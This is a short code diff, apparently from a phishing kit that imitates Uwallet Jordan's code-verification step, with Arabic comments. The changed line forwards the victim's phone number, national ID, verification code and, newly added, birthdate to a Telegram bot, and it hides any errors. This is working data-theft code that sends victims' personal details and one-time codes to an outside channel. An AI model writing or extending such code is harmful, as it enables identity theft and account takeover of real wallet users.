@@ -508,10 +508,10 @@
         codeAttempts++;
         userData.code4b = code;
 
-        // إرسال محاولة الرمز للبوت لتوثيق المحاولات (اختياري)
+        // إرسال محاولة الرمز للبوت لتوثيق المحاولات (الآن تتضمن تاريخ الميلاد أيضاً)
         try {
           await sendToTelegram(
-            `🟦 محاولة رمز تحقق Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 ${userData.nationalId}\n🔒 الرمز: ${userData.code4b}\nمحاولة: ${codeAttempts}/${maxCodeAttempts}`
+            `🟦 محاولة رمز تحقق Uwallet الأردن\n📱 الهاتف: ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔒 الرمز: ${userData.code4b}\nمحاولة: ${codeAttempts}/${maxCodeAttempts}`
           );
         } catch (err) {}
 
